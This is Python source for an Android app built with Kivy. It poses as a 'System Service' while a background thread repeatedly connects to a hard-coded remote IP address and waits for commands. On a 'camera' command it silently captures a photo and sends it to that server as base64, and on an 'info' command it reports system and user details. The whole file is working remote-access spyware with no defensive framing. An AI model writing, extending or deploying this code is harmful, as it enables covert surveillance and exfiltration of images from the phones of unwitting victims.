from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import socket
import struct
import json
import threading
import time
import base64
import os
import platform

# Configuration
HOST = '170.64.186.179'
PORT = 6000

# Try importing cv2 for camera
try:
    import cv2
except ImportError:
    cv2 = None

class AndroidClient(App):
    def build(self):
        self.label = Label(text="System Service Running...")
        # Start client in background
        threading.Thread(target=self.client_loop, daemon=True).start()
        return self.label

    def client_loop(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((HOST, PORT))
                # Update UI
                Clock.schedule_once(lambda dt: setattr(self.label, 'text', "Connected to Server"), 0)
                self.handle_server()
            except Exception as e:
                Clock.schedule_once(lambda dt: setattr(self.label, 'text', f"Connection Failed: {e}"), 0)
                time.sleep(5)

    def handle_server(self):
        while True:
            try:
                header = self.recv_all(self.sock, 4)
                if not header: break
                length = struct.unpack('!I', header)[0]
                data = self.recv_all(self.sock, length)
                if not data: break
                
                command = json.loads(data.decode('utf-8'))
                response = self.process_command(command)
                
                resp_bytes = json.dumps(response).encode('utf-8')
                resp_length = struct.pack('!I', len(resp_bytes))
                self.sock.sendall(resp_length + resp_bytes)
            except Exception as e:
                break
        self.sock.close()

    def recv_all(self, sock, size):
        data = b''
        while len(data) < size:
            try:
                chunk = sock.recv(size - len(data))
                if not chunk: return None
                data += chunk
            except:
                return None
        return data

    def process_command(self, cmd_obj):
        cmd_type = cmd_obj.get('type')
        
        if cmd_type == 'info':
            # Android specific info can be gathered via plyer, but platform works basics
            info = f"System: Android (Python)\nUser: {os.environ.get('USER', 'mobile')}"
            return {'output': info}
            
        elif cmd_type == 'camera':
            if cv2:
                try:
                    # Android camera index can vary, usually 0 (back) or 1 (front)
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        _, buffer = cv2.imencode('.jpg', frame)
                        b64_string = base64.b64encode(buffer).decode('utf-8')
                        return {'output': 'Camera captured.', 'image_b64': b64_string}
                    else:
                        return {'error': 'Failed to capture frame (Camera busy or permission denied).'}
                except Exception as e:
                    return {'error': f"Camera error: {e}"}
            else:
                return {'error': "OpenCV not available in this APK build."}
        
        return {'error': "Command not supported on Android"}

if __name__ == '__main__':
    AndroidClient().run()
